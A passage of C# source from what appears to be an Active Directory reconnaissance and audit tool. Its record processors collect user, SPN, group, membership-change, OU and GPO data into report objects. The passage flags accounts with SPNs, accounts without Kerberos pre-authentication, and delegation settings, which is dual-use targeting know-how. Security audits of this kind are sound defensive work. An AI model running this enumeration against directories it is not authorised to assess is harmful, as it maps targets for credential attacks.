                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("Exception caught: {0}", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members["UserAccountControl"].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members["AccountNotDelegated"].Value);
                        if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = "Constrained";
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                        }
                        if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdUser.Members["SamAccountName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", CleanString(AdUser.Members["CanonicalName"].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    string Description = CleanString(AdUser.Members["Description"].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", CleanString(AdUser.Members["SamAccountName"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    string SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["msDS-ReplValueMetaData"].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Members["SamAccountName"].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members["ObjectClass"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberUserName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", AdGroup.Members["objectSid"].Value));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
